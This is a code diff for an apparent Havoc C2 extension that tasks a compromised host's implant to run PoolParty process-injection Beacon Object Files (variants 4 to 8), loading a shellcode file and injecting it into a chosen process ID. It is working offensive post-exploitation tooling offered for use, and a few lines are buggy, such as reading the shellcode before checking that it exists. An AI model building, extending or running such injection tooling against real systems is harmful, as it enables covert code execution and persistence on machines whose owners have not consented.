@@ -87,27 +87,55 @@ def generate(demonID, *params):
 
 		else:
 			demon.ConsoleWrite(demon.CONSOLE_INFO, f"Generating payload for {arch} with listener as {listener}")
-	
 			TaskID = generate_payload(demon, arch, listener)
-			# demon.ConsoleWrite(demon.CONSOLE_INFO, "Generating PoolParty.exe file with new shellcode")
-			
-			# demon.ConsoleWrite(demon.CONSOLE_INFO, "PoolParty ready to use!")
 			return TaskID
-	
 
 def execute(demon):
+	TaskID : str = None
+
 	global variant
 	global pid
-	demon.ConsoleWrite( demon.CONSOLE_INFO, "Tasked demon to run PoolParty with variant %s on PID %s" % (variant,pid) )
-	query = f"-V {variant} -P {pid}"
+
+	packer : Packer = Packer()
+
+	objectFile = cwd + "/bin/"
+	if variant == "4":
+		objectFile += "PoolPartyBof_V4.x64.o"
+	elif variant == "5":
+		objectFile += "PoolPartyBof_V5.x64.o"
+	elif variant == "6":
+		objectFile += "PoolPartyBof_V6.x64.o"
+	elif variant == "7":
+		objectFile += "PoolPartyBof_V7.x64.o"
+	elif variant == "8":
+		objectFile += "PoolPartyBof_V8.x64.o"
+	else:
+		demon.ConsoleWrite(demon.CONSOLE_ERROR, f"ERROR OCCURED!")
+		return False
+
+	Shellcode: bytes = b''
+	Shellcode = open(shellcode_file_path, 'rb').read()
+	if exists(shellcode_file_path) is False:
+		demon.ConsoleWrite(demon.CONSOLE_ERROR, f"File containing shellcode not found: {shellcodeFile}")
+		return False
+	else:
+		Shellcode = open(shellcode_file_path, 'rb').read()
+		if len(Shellcode) == 0:
+			demon.ConsoleWrite(demon.CONSOLE_ERROR, "Shellcode is empty.")
+			return False
+
+	packer.addint(int(pid))
+	packer.addbytes(Shellcode)
 	
-	demon.Command(TaskID, "dotnet inline-execute %s %s" % (poolparty_file_path,query))
+	TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to run PoolParty with variant %s on PID %s" % (variant,pid))
+	demon.InlineExecute(TaskID, "go", objectFile, packer.getbuffer(), False)
+
+	return TaskID
 
 def save_shellcode(data):
 	with open(shellcode_file_path, "wb") as file:
 		file.write(b64decode(data))
 	file.close()
-	os.system(f"python3 {cwd}/generate.py -f {shellcode_file_path} ")
 
 def run_parse_params(demon, params):
 	global variant
@@ -118,7 +146,7 @@ def run_parse_params(demon, params):
 	skip = False
 
 	if num_params != 4:
-		demon.ConsoleWrite(demon.CONSOLE_ERROR,"USAGE:  poolparty run -V {1/2/3/4/5/6/7/8} -P {PID}")
+		demon.ConsoleWrite(demon.CONSOLE_ERROR,"USAGE:  poolparty run -V {4/5/6/7/8} -P {PID}")
 		return False
 
 	for i in range(num_params):
@@ -131,9 +159,13 @@ def run_parse_params(demon, params):
 		if param == '-V' or param == '-v':
 			skip = True
 			if i+1 >= num_params:
-				demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing variant value (-v {1/2/3/4/5/6/7/8})" )
+				demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing variant value (-v {4/5/6/7/8})" )
 				return False
 			variant = params[i+1]
+
+			v = int(variant)
+			if v < 1 or v > 8:
+				return False
 
 		elif param == '-P' or param == '-p':
 			skip = True
@@ -143,12 +175,11 @@ def run_parse_params(demon, params):
 			pid = params[i+1]
 
 		elif param == '-h' or param == "help":
-			demon.ConsoleWrite(demon.CONSOLE_INFO,"USAGE:  poolparty run -V {1/2/3/4/5/6/7/8} -P {PID}")
+			demon.ConsoleWrite(demon.CONSOLE_INFO,"USAGE:  poolparty run -V {4/5/6/7/8} -P {PID}")
 			demon.ConsoleWrite(demon.CONSOLE_INFO,"\n")
-			demon.ConsoleWrite(demon.CONSOLE_INFO,"VARIANT   -    DESCRIPTION")
 
 		else:
-			demon.ConsoleWrite(demon.CONSOLE_ERROR,"USAGE:  poolparty run -V {1/2/3/4/5/6/7/8} -P {PID}")
+			demon.ConsoleWrite(demon.CONSOLE_ERROR,"USAGE:  poolparty run -V {4/5/6/7/8} -P {PID}")
 
 	execute(demon)
 	return True
@@ -157,12 +188,12 @@ def run(demonID, *params):
 	TaskID : str = None
 	demon : Demon = None
 	demon = Demon(demonID)
-
-	if not os.path.exists(poolparty_file_path):
-		demon.ConsoleWrite(demon.CONSOLE_ERROR, "Please generate the PoolParty payload first!")
+	
+	if exists(shellcode_file_path) is False:
+		demon.ConsoleWrite(demon.CONSOLE_ERROR, "If you have just generated the payload, wait for a min or two before running this command")
+		demon.ConsoleWrite(demon.CONSOLE_ERROR, "Shellcode file not found!!")
 		return False
 
-	
 	TaskID = run_parse_params(demon, params)
 
 	return TaskID
